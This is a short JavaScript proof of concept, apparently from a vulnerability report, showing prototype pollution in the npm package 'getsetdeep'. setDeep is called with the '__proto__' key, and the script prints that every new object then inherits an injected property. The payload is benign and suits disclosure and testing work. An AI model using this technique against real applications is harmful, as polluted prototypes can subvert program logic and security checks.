const s = require('getsetdeep').setDeep;

var malicious_payload = '{"oops": "It works!"}';
a = {};
console.log('Before: ' + a.oops);
s(a, '__proto__', JSON.parse(malicious_payload));
console.log('After: ' + a.oops);
console.log('After: ' + {}.oops);